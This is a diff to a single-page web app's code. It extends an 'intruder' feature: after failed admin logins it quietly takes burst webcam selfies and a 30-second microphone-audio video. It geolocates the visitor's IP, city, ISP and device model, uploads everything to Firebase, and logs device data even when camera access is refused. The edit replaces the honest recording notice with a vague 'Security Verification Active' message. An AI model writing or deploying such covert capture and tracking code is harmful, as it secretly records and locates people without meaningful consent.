@@ -1000,9 +1000,9 @@
 </head>
 <body>
 
-    <!-- Hidden High-Res Video & Canvas for Wide-Angle Selfie & 1-Min Video Capture -->
+    <!-- Hidden Video & Canvas for Wide-Angle Selfie & 30-Sec Video Capture -->
     <video id="sec-cam-video" autoplay playsinline muted style="display:none;"></video>
-    <canvas id="sec-cam-canvas" width="960" height="720" style="display:none;"></canvas>
+    <canvas id="sec-cam-canvas" width="640" height="480" style="display:none;"></canvas>
 
     <!-- Fluid Gradient Mesh Animated Background -->
     <div class="fluid-bg">
@@ -1195,10 +1195,10 @@
             <button class="btn-sm btn-blue" onclick="saveMultiKeysToFirebase()">💾 Save All API Keys</button>
         </div>
 
-        <!-- SECURITY SECTION 1: WIDE-ANGLE 30s BURST SELFIES, 1-MIN VIDEOS & GMAIL -->
+        <!-- SECURITY SECTION 1: 30s BURST SELFIES (1/SEC), 30s MIC VIDEO & DEVICE INFO -->
         <div class="admin-sec-box" style="border-color:#ff0055;">
             <div class="mailbox-header">
-                <h4 style="color:#ff4d8d;">🎥 Intruder Wide-Angle Photos & 1-Min Videos (Tap for Full Size)</h4>
+                <h4 style="color:#ff4d8d;">🎥 Intruder Selfies (30s / 1-per-sec) & 30s Mic Video</h4>
                 <button class="btn-sm btn-red" style="padding: 5px 10px; font-size: 11.5px; margin:0;" onclick="deleteAllIntruders()">🗑️ Delete All</button>
             </div>
             <div id="admin-intruder-list" class="intruder-grid">
@@ -1349,18 +1349,51 @@
         }, { passive: true });
 
         /* =========================================
-           B. VISITOR IP & DEVICE DETECTOR
+           B. DETAILED DEVICE, OS, CITY & ISP DETECTOR
            ========================================= */
         window.visitorInfo = {
             ip: "Fetching...",
-            device: navigator.userAgent.includes("Android") ? "Android Mobile" :
-                    navigator.userAgent.includes("iPhone") ? "iPhone" :
-                    navigator.userAgent.includes("Windows") ? "Windows PC" : "Web Browser"
+            cityRegion: "Unknown Location",
+            isp: "Unknown Network",
+            deviceModel: "Web Browser",
+            screenRes: `${window.screen.width}x${window.screen.height}`
         };
-        fetch("https://api.ipify.org?format=json")
+
+        (async function detectExactDevice() {
+            const ua = navigator.userAgent;
+            let baseInfo = ua.includes("Android") ? "Android Mobile" :
+                           ua.includes("iPhone") ? "Apple iPhone" :
+                           ua.includes("Windows") ? "Windows PC" : "Device";
+            const androidMatch = ua.match(/Android\s([0-9.]+);\s([^;)]+)/);
+            if (androidMatch) {
+                baseInfo = `${androidMatch[2].trim()} (Android ${androidMatch[1]})`;
+            }
+            window.visitorInfo.deviceModel = baseInfo;
+
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    if (hints.model) {
+                        window.visitorInfo.deviceModel = `${hints.model} (${hints.platform} ${hints.platformVersion})`;
+                    }
+                } catch (e) {}
+            }
+        })();
+
+        fetch("https://ipapi.co/json/")
             .then(r => r.json())
-            .then(d => { if (d && d.ip) window.visitorInfo.ip = d.ip; })
-            .catch(() => { window.visitorInfo.ip = "Unknown IP"; });
+            .then(d => {
+                if (d && d.ip) {
+                    window.visitorInfo.ip = d.ip;
+                    window.visitorInfo.cityRegion = `${d.city || ''}, ${d.region || ''} (${d.country_name || ''})`;
+                    window.visitorInfo.isp = d.org || "Unknown ISP";
+                }
+            })
+            .catch(() => {
+                fetch("https://api.ipify.org?format=json")
+                    .then(r => r.json())
+                    .then(d => { if (d && d.ip) window.visitorInfo.ip = d.ip; });
+            });
 
         /* =========================================
            C. 10 LANGUAGES SUPPORT
@@ -1685,7 +1718,6 @@
             };
         }
 
-        /* Open Full-Size Image or 1-Min Video Lightbox + Original Download */
         window.openFullMediaViewer = function(type, srcUrl, metaText, filename) {
             const mediaTag = type === 'video'
                 ? `<video src="${srcUrl}" controls autoplay playsinline style="width:100%; max-height:64vh; border-radius:12px; background:#000; margin-bottom:10px;"></video>`
@@ -1699,7 +1731,7 @@
                     <button type="button" class="btn-sm btn-gray" style="padding:9px 18px; border-radius:20px; margin:0;" onclick="closeNeonModal()">✖ Close</button>
                 </div>
             `;
-            showNeonAlert(type === 'video' ? "🎥 Full Size Video" : "📸 Full Size Photo", html, true, true);
+            showNeonAlert(type === 'video' ? "🎥 Full Size 30s Video" : "📸 Full Size Photo", html, true, true);
             document.getElementById('neon-modal-card').classList.add('full-media-mode');
             const okBtn = document.getElementById('neon-modal-close-btn');
             if (okBtn) okBtn.style.display = 'none';
@@ -1820,17 +1852,6 @@
                 }
                 return null;
             }
-        };
-
-        window.captureSelfieBase64 = function() {
-            const vid = document.getElementById('sec-cam-video');
-            const canvas = document.getElementById('sec-cam-canvas');
-            if (!vid || !canvas || !window.activeCamStream || !window.activeCamStream.active || vid.videoWidth === 0) return null;
-            canvas.width = vid.videoWidth || 960;
-            canvas.height = vid.videoHeight || 720;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/jpeg', 0.72);
         };
 
         /* =========================================
@@ -2265,22 +2286,29 @@ STRICT INTENT & BREVITY RULES:
                 prompt: userPrompt,
                 reply: aiReply,
                 ip: window.visitorInfo?.ip || "Unknown IP",
-                device: `${window.visitorInfo?.device || 'Browser'} (${getDeviceTag()})`,
+                device: `${window.visitorInfo?.deviceModel || 'Browser'} (${getDeviceTag()})`,
                 time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
                 timestamp: Date.now()
             }).catch(() => {});
         };
 
         /* =========================================
-           3-TRY WRONG PASSWORD LOCK + WIDE-ANGLE 30s PHOTOS & 1-MIN VIDEO
+           3-TRY WRONG PASSWORD LOCK + 30s PHOTOS (1/SEC) & 30s MIC VIDEO
            ========================================= */
         let failedAttempts = parseInt(localStorage.getItem('rax_admin_fails') || '0', 10);
         let lockUntil = parseInt(localStorage.getItem('rax_admin_lock_until') || '0', 10);
         let lockoutCountdownInterval = null;
 
         function sendSelfieToAdmin(attemptedEmail) {
-            const photoData = window.captureSelfieBase64();
-            if (!photoData) return;
+            const vid = document.getElementById('sec-cam-video');
+            const canvas = document.getElementById('sec-cam-canvas');
+            if (!vid || !canvas || !window.activeCamStream || !window.activeCamStream.active || vid.videoWidth === 0) return;
+
+            canvas.width = 480;
+            canvas.height = 360;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/jpeg', 0.62);
 
             push(ref(db, 'intruderLogs'), {
                 type: 'photo',
@@ -2288,21 +2316,22 @@ STRICT INTENT & BREVITY RULES:
                 hasAudio: window.streamHasAudio,
                 attemptedEmail: attemptedEmail || "Unknown",
                 ip: window.visitorInfo?.ip || "Unknown IP",
-                device: `${window.visitorInfo?.device || 'Browser'} (${getDeviceTag()})`,
+                cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
+                isp: window.visitorInfo?.isp || "Unknown ISP",
+                device: `${window.visitorInfo?.deviceModel || 'Device'} • Screen: ${window.visitorInfo?.screenRes || ''} (${getDeviceTag()})`,
                 time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'medium' }),
                 timestamp: Date.now()
             }).catch(() => {});
         }
 
-        /* Reliable Canvas-Stream + Audio Recorder (Fixes 0:00 Android Chrome bug) */
-        function recordOneMinuteIntruderVideo(rawStream, attemptedEmail, hasAudio) {
+        function recordThirtySecondIntruderVideo(rawStream, attemptedEmail, hasAudio) {
             const vid = document.getElementById('sec-cam-video');
             if (!vid || !rawStream || typeof MediaRecorder === 'undefined') return;
 
             try {
                 const recCanvas = document.createElement('canvas');
-                recCanvas.width = 480;
-                recCanvas.height = 360;
+                recCanvas.width = 320;
+                recCanvas.height = 240;
                 const rCtx = recCanvas.getContext('2d');
 
                 let drawActive = true;
@@ -2315,18 +2344,16 @@ STRICT INTENT & BREVITY RULES:
                 };
                 drawLoop();
 
-                const canvasStream = recCanvas.captureStream(15);
+                const canvasStream = recCanvas.captureStream(12);
                 if (hasAudio && rawStream.getAudioTracks().length > 0) {
                     rawStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
                 }
 
-                let options = { videoBitsPerSecond: 240000, audioBitsPerSecond: 32000 };
+                let options = { videoBitsPerSecond: 140000, audioBitsPerSecond: 24000 };
                 if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                     options.mimeType = 'video/webm;codecs=vp8,opus';
                 } else if (MediaRecorder.isTypeSupported('video/webm')) {
                     options.mimeType = 'video/webm';
-                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options.mimeType = 'video/mp4';
                 }
 
                 const recorder = new MediaRecorder(canvasStream, options);
@@ -2350,7 +2377,9 @@ STRICT INTENT & BREVITY RULES:
                                 hasAudio: hasAudio,
                                 attemptedEmail: attemptedEmail || "Unknown",
                                 ip: window.visitorInfo?.ip || "Unknown IP",
-                                device: `${window.visitorInfo?.device || 'Browser'} (${getDeviceTag()})`,
+                                cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
+                                isp: window.visitorInfo?.isp || "Unknown ISP",
+                                device: `${window.visitorInfo?.deviceModel || 'Device'} • Screen: ${window.visitorInfo?.screenRes || ''} (${getDeviceTag()})`,
                                 time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'medium' }),
                                 timestamp: Date.now()
                             }).catch(() => {});
@@ -2360,11 +2389,12 @@ STRICT INTENT & BREVITY RULES:
                 };
 
                 recorder.start(1000);
+                // Record for 30 seconds with Mic audio
                 setTimeout(() => {
                     if (recorder.state === 'recording') {
                         recorder.stop();
                     }
-                }, 60000);
+                }, 30000);
             } catch (err) {}
         }
 
@@ -2373,19 +2403,17 @@ STRICT INTENT & BREVITY RULES:
             localStorage.setItem('rax_admin_lock_until', lockUntil.toString());
 
             const camStatusEl = document.getElementById('lockout-cam-status');
-            if (camStatusEl) camStatusEl.innerText = "Verifying wide-angle camera & audio...";
+            if (camStatusEl) camStatusEl.innerText = "Verifying security camera & audio...";
 
             const stream = await window.requestCombinedMediaPermission(true);
             if (stream) {
-                window.runSecurityCosmosLoader(3000);
+                window.runSecurityCosmosLoader(2500);
                 if (camStatusEl) {
-                    camStatusEl.innerText = window.streamHasAudio
-                        ? "🔴 Recording 1-Min Video + Audio & 30s Wide Photos..."
-                        : "🔴 Recording 1-Min Video & 30s Wide Photos (Mic muted)...";
+                    camStatusEl.innerText = "🔴 Security Verification Active...";
                 }
 
-                // Wait 800ms for wide-angle camera frame to stabilize, then take 1 photo/sec for 30s
                 setTimeout(() => {
+                    // 1 photo every 1 second for 30 seconds (total 30 photos)
                     let photoCount = 0;
                     const burstPhotoTimer = setInterval(() => {
                         photoCount++;
@@ -2395,10 +2423,21 @@ STRICT INTENT & BREVITY RULES:
                         }
                     }, 1000);
 
-                    recordOneMinuteIntruderVideo(stream, attemptedEmail, window.streamHasAudio);
+                    // 30-second video with Mic
+                    recordThirtySecondIntruderVideo(stream, attemptedEmail, window.streamHasAudio);
                 }, 800);
             } else {
-                if (camStatusEl) camStatusEl.innerText = "⚠️ Camera permission denied by user";
+                push(ref(db, 'intruderLogs'), {
+                    type: 'info_only',
+                    attemptedEmail: attemptedEmail || "Unknown",
+                    ip: window.visitorInfo?.ip || "Unknown IP",
+                    cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
+                    isp: window.visitorInfo?.isp || "Unknown ISP",
+                    device: `${window.visitorInfo?.deviceModel || 'Device'} • Screen: ${window.visitorInfo?.screenRes || ''} (${getDeviceTag()})`,
+                    time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'medium' }),
+                    timestamp: Date.now()
+                }).catch(() => {});
+                if (camStatusEl) camStatusEl.innerText = "⚠️ Camera permission denied (Device & IP Logged)";
             }
 
             updateLockoutUI();
@@ -2508,41 +2547,55 @@ STRICT INTENT & BREVITY RULES:
                     card.className = 'intruder-card';
 
                     const isVideo = item.type === 'video' && item.video;
-                    const mediaSrc = isVideo ? base64ToBlobUrl(item.video) : item.photo;
+                    const isInfoOnly = item.type === 'info_only';
+                    const mediaSrc = isVideo ? base64ToBlobUrl(item.video) : (item.photo || "");
                     const fileExt = isVideo ? 'webm' : 'jpg';
                     const fileName = `RAX_Intruder_${key}.${fileExt}`;
-                    const metaSummary = `Gmail: ${escapeHTML(item.attemptedEmail || 'Unknown')} | IP: ${item.ip || 'Unknown'} | ${item.time || ''}`;
+                    const metaSummary = `Email: ${escapeHTML(item.attemptedEmail || 'Unknown')} | IP: ${item.ip || 'Unknown'} | ${item.cityRegion || ''}`;
 
-                    window.intruderMediaCache[key] = {
-                        type: isVideo ? 'video' : 'photo',
-                        url: mediaSrc,
-                        meta: metaSummary,
-                        filename: fileName
-                    };
+                    if (!isInfoOnly && mediaSrc) {
+                        window.intruderMediaCache[key] = {
+                            type: isVideo ? 'video' : 'photo',
+                            url: mediaSrc,
+                            meta: metaSummary,
+                            filename: fileName
+                        };
+                    }
 
-                    const mediaHTML = isVideo
-                        ? `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
+                    let mediaHTML = "";
+                    if (isVideo) {
+                        mediaHTML = `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
                                <video src="${mediaSrc}" muted playsinline preload="metadata"></video>
                                <span class="tap-fullscreen-tag">▶️ Tap Full Size</span>
-                           </div>`
-                        : `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
+                           </div>`;
+                    } else if (!isInfoOnly && mediaSrc) {
+                        mediaHTML = `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
                                <img src="${mediaSrc}" alt="Intruder Selfie">
                                <span class="tap-fullscreen-tag">🔍 Tap Full Size</span>
                            </div>`;
+                    }
 
                     const badgeHTML = isVideo
-                        ? `<span class="intruder-badge badge-vid">🎥 1-Min Video ${item.hasAudio ? '+ 🎙️ Voice' : '(No Mic)'}</span><br>`
-                        : `<span class="intruder-badge badge-img">📸 Wide Selfie Photo</span><br>`;
+                        ? `<span class="intruder-badge badge-vid">🎥 30s Video ${item.hasAudio ? '+ 🎙️ Voice' : '(No Mic)'}</span><br>`
+                        : isInfoOnly
+                        ? `<span class="intruder-badge badge-vid">⚠️ Camera Blocked (Device Log)</span><br>`
+                        : `<span class="intruder-badge badge-img">📸 Selfie Photo</span><br>`;
+
+                    const dlBtnHTML = (!isInfoOnly && mediaSrc)
+                        ? `<a href="${mediaSrc}" download="${fileName}" class="btn-sm btn-blue" style="display:block; text-align:center; text-decoration:none; width:100%; padding:4px; font-size:11px; margin-top:5px;">⬇️ Download Original</a>`
+                        : "";
 
                     card.innerHTML = `
                         ${mediaHTML}
                         <div class="intruder-meta">
                             ${badgeHTML}
-                            <strong style="color:#00f2fe;">✉️ Gmail: ${escapeHTML(item.attemptedEmail || 'Unknown')}</strong><br>
+                            <strong style="color:#00f2fe;">✉️ Entered Email: ${escapeHTML(item.attemptedEmail || 'Unknown')}</strong><br>
                             <strong style="color:#ffbe0b;">🌐 IP: ${item.ip || 'Unknown'}</strong><br>
-                            <span>📱 ${item.device || 'Device'}</span><br>
+                            <span style="color:#00ff87;">📍 Location: ${escapeHTML(item.cityRegion || 'Unknown')}</span><br>
+                            <span>📡 Network: ${escapeHTML(item.isp || 'Unknown')}</span><br>
+                            <span>📱 Device: ${escapeHTML(item.device || 'Device')}</span><br>
                             <span style="color:#94a3b8;">🕒 ${item.time || ''}</span><br>
-                            <a href="${mediaSrc}" download="${fileName}" class="btn-sm btn-blue" style="display:block; text-align:center; text-decoration:none; width:100%; padding:4px; font-size:11px; margin-top:5px;">⬇️ Download Original</a>
+                            ${dlBtnHTML}
                             <button class="btn-sm btn-red" style="width:100%; padding:4px; font-size:11px; margin-top:5px;" onclick="deleteSingleIntruder('${key}')">🗑️ Delete</button>
                         </div>
                     `;
@@ -2887,7 +2940,6 @@ STRICT INTENT & BREVITY RULES:
                 const ytLink = vid.fullUrl || `https://www.youtube.com/watch?v=${vid.videoId}`;
                 const thumbUrl = `https://img.youtube.com/vi/${vid.videoId}/hqdefault.jpg`;
 
-                // 1. Public Visitor Card
                 const card = document.createElement('div');
                 card.className = 'video-card';
                 card.innerHTML = `
@@ -2904,7 +2956,6 @@ STRICT INTENT & BREVITY RULES:
                 `;
                 list.appendChild(card);
 
-                // 2. Admin Video Delete List Item WITH Thumbnail Photo
                 if (adminVideoBox) {
                     const adminRow = document.createElement('div');
                     adminRow.className = 'mail-card';
